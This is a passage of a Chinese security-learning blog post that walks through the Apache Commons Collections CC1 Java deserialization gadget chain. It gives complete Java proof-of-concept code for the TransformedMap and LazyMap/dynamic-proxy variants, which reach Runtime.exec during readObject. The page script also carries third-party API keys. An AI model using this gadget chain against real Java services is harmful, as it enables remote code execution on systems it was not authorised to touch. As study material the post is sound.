class_">Transformer</span>[]</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span> &#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">                &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">   <span class="comment">//     chainedTransformer.transform(Runtime.class);</span></span><br><span class="line">         <span class="comment">//Class c = Runtime.class;</span></span><br><span class="line">          <span class="comment">//Method method =  c.getMethod(&quot;getRuntime&quot;,null);</span></span><br><span class="line">          <span class="comment">//Runtime r = (Runtime) method.invoke(null,null); //getRuntime是无参函数</span></span><br><span class="line"><span class="comment">//          Method method1 = c.getMethod(&quot;exec&quot;,String.class);</span></span><br><span class="line"><span class="comment">//          method1.invoke(r,&quot;calc&quot;);</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; map = TransformedMap.decorate(hashMap,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"><span class="comment">////        for (Map.Entry entry:map.entrySet())</span></span><br><span class="line"><span class="comment">////        &#123;</span></span><br><span class="line"><span class="comment">////            entry.setValue(runtime);</span></span><br><span class="line"><span class="comment">////        &#125;</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span>  <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class,map);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">            oos.writeObject(obj);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>上面写的非常详细了，有疑问的时候可以回来温习一下</p>
+<p><strong>接下来还有个lazyMap版本</strong></p>
+<p>我们在上面写的是<code>TransformedMap</code>版本，因为在看谁调用了transformer的时候，发现了还有lazyMap这个类，然后又巧妙的发现了这个类可以用，于是就有了这个版本</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230318103058344.png" alt="image-20230318103058344"></p>
+<p>lazyMap的get()方法，那么我们就和上面的思路一样，找谁调用了get()方法</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230318103911715.png" alt="image-20230318103911715"></p>
+<p>然后在这个类里边发现了get方法，并且这个memberValue可控</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230318104007111.png" alt="image-20230318104007111"></p>
+<p>是在这个invoke方法里面</p>
+<p>所以这里得用动态代理方法</p>
+<p>思路就是<code>AnnotationInvocationHandler.readObject</code>里面传一个动态代理方法，然后动态代理就会使用invoke，invoke里面就会调用lazyMap.get方法(因为memberValues可控)，然后get方法里面就传一个<code>chainedTransformer</code>(get里面调用了transfom方法),然后就能弹计算器了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230318110547425.png" alt="image-20230318110547425"></p>
+<p>写好了，进行对这段代码进行解释一下</p>
+<p>这里的LazyMap的decorate方法和TransformedMap.decorate方法是一个意思，这里就不多说了，下面的实例化对象使用InvocationHandler是因为readObject所在的AnnotationInvocationHandler是继承于InvocationHandler的(还有一点是不能使用这个AnnotationInvocationHandler    可以自己去idea里面试一下)  </p>
+<p>这里传的lazyMap就是可控的memberValues,在反序列化的时候这个memberValues就会调用这个entrySet()方法，因为这个方法是无参的，能符合接下来动态代理调用的invoke方法里调用get的条件，下面那行写的<code>xProxy.newProxyInstance(h.getClass().getClassLoader(), h.getClass().getInterfaces(),h);</code>方法就是为了调用invoke方法，从而调用到lazymap里的get方法，然后get的方法就会调用chainedTransformer.tranfome方法，从而实现命令执行。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230318112157242.png" alt="image-20230318112157242"></p>
+<p>最后再补充一点就完成了</p>
+<p>因为我们是想在readObject里面执行，然后刚好readobject所在的这个类是接收map类的，然后动态代理的话是必须得跟一个接口的，所以就<code>Map map = (Map) Proxy.newProxyInstance(h.getClass().getClassLoader(), h.getClass().getInterfaces(),h);</code>这样来写，然后在实例化一下，把东西传进去，然后进行序列化</p>
+<p><strong>写好的链子</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.commons.Method;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="comment">//import java.lang.reflect.Method;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line"><span class="comment">//        Runtime runtime = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//         InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span></span><br><span class="line"><span class="comment">//        Method method = (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null &#125;).transform(Runtime.class);</span></span><br><span class="line"><span class="comment">//        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(method);</span></span><br><span class="line"><span class="comment">//            new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span> &#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">                &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//chainedTransformer.transform(Runtime.class);</span></span><br><span class="line">         <span class="comment">//Class c = Runtime.class;</span></span><br><span class="line">          <span class="comment">//Method method =  c.getMethod(&quot;getRuntime&quot;,null);</span></span><br><span class="line">          <span class="comment">//Runtime r = (Runtime) method.invoke(null,null); //getRuntime是无参函数</span></span><br><span class="line"><span class="comment">//          Method method1 = c.getMethod(&quot;exec&quot;,String.class);</span></span><br><span class="line"><span class="comment">//          method1.invoke(r,&quot;calc&quot;);</span></span><br><span class="line"><span class="comment">//        HashMap hashMap = new HashMap&lt;&gt;();</span></span><br><span class="line"><span class="comment">//        hashMap.put(&quot;value&quot;,&quot;aaa&quot;);</span></span><br><span class="line"><span class="comment">//        Map&lt;Object,Object&gt; map = TransformedMap.decorate(hashMap,null,chainedTransformer);</span></span><br><span class="line"><span class="comment">//////        for (Map.Entry entry:map.entrySet())</span></span><br><span class="line"><span class="comment">//////        &#123;</span></span><br><span class="line"><span class="comment">//////            entry.setValue(runtime);</span></span><br><span class="line"><span class="comment">//////        &#125;</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span>  <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class,lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(),h);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Override.class,map);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(o);</span></span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">            oos.writeObject(obj);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><strong>最后的话cc1链就全部学完了，也收获了很多</strong></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://ke1nys.github.io">ke1nys</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://ke1nys.github.io/posts/488024db.html">https://ke1nys.github.io/posts/488024db.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://ke1nys.github.io" target="_blank">ke1nys`Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1/">java反序列化 cc1</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/29301d9.html"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">ctfshow-代码审计</div></div></a></div><div class="next-post pull-right"><a href="/posts/1941d3ec.html"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">nodejs-污染</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/qq.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">ke1nys</div><div class="author-info__description">生命不息,折腾不止</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">40</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">37</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ke1nys/ke1nys.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客一起学习嗷~</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/6446e84f.html" title="buuctf-刷题记录 第二页"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="buuctf-刷题记录 第二页"/></a><div class="content"><a class="title" href="/posts/6446e84f.html" title="buuctf-刷题记录 第二页">buuctf-刷题记录 第二页</a><time datetime="2023-04-06T06:49:17.000Z" title="发表于 2023-04-06 14:49:17">2023-04-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/28e06bac.html" title="ctfshow-愚人杯"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow-愚人杯"/></a><div class="content"><a class="title" href="/posts/28e06bac.html" title="ctfshow-愚人杯">ctfshow-愚人杯</a><time datetime="2023-04-03T15:16:52.000Z" title="发表于 2023-04-03 23:16:52">2023-04-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/a14faaa5.html" title="杭师校赛决赛-web"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="杭师校赛决赛-web"/></a><div class="content"><a class="title" href="/posts/a14faaa5.html" title="杭师校赛决赛-web">杭师校赛决赛-web</a><time datetime="2023-04-03T12:58:59.000Z" title="发表于 2023-04-03 20:58:59">2023-04-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/f0c9bda6.html" title="ctfshow-其他 刷题记录"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow-其他 刷题记录"/></a><div class="content"><a class="title" href="/posts/f0c9bda6.html" title="ctfshow-其他 刷题记录">ctfshow-其他 刷题记录</a><time datetime="2023-03-30T13:04:08.000Z" title="发表于 2023-03-30 21:04:08">2023-03-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/41d43cf2.html" title="htb-starting point"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="htb-starting point"/></a><div class="content"><a class="title" href="/posts/41d43cf2.html" title="htb-starting point">htb-starting point</a><time datetime="2023-03-29T07:21:55.000Z" title="发表于 2023-03-29 15:21:55">2023-03-29</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By ke1nys</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><div class="app-refresh" id="app-refresh" style="position: fixed;top: -2.2rem;left: 0;right: 0;z-index: 99999;padding: 0 1rem;font-size: 15px;height: 2.2rem;transition: all 0.3s ease;"><div class="app-refresh-wrap" style=" display: flex;color: #fff;height: 100%;align-items: center;justify-content: center;"><label>✨ 有新文章啦！ 👉</label><a href="javascript:void(0)" onclick="location.reload()"><span style="color: #fff;text-decoration: underline;cursor: pointer;">🍗点击食用🍔</span></a></div></div><script>if ('serviceWorker' in navigator) {
+if (navigator.serviceWorker.controller) {
+navigator.serviceWorker.addEventListener('controllerchange', function() {
+showNotification()
+})
+}
+window.addEventListener('load', function() {
+navigator.serviceWorker.register('/sw.js')
+})
+}
+function showNotification() {
+if (GLOBAL_CONFIG.Snackbar) {
+var snackbarBg =
+document.documentElement.getAttribute('data-theme') === 'light' ?
+GLOBAL_CONFIG.Snackbar.bgLight :
+GLOBAL_CONFIG.Snackbar.bgDark
+var snackbarPos = GLOBAL_CONFIG.Snackbar.position
+Snackbar.show({
+text: '✨ 有新文章啦！ 👉',
+backgroundColor: snackbarBg,
+duration: 500000,
+pos: snackbarPos,
+actionText: '🍗点击食用🍔',
+actionTextColor: '#fff',
+onActionClick: function(e) {
+location.reload()
+},
+})
+} else {
+var showBg =
+document.documentElement.getAttribute('data-theme') === 'light' ?
+'#3b70fc' :
+'#1f1f1f'
+var cssText = `top: 0; background: ${showBg};`
+document.getElementById('app-refresh').style.cssText = cssText
+}
+}</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_clock_anzhiyu_injector_config(){
+    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
+    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
+    console.log('已挂载butterfly_clock_anzhiyu')
+    if(parent_div_git) {
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var qweather_key = 'b16a1fa0e63c46a4b8f28abfb06ae3fe';
+  var gaud_map_key = 'e2b04289e870b005374ee030148d64fd&s=rsv3';
+  var baidu_ak_key = 'undefined';
+  var flag = 0;
+  var clock_rectangle = '112.982279,28.19409';
+  var clock_default_rectangle_enable = 'false';
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  </script><script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script><script data-pjax src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.js"></script><script data-pjax>
+  function butterfly_footer_beautify_injector_config(){
+    var parent_div_git = document.getElementById('footer-wrap');
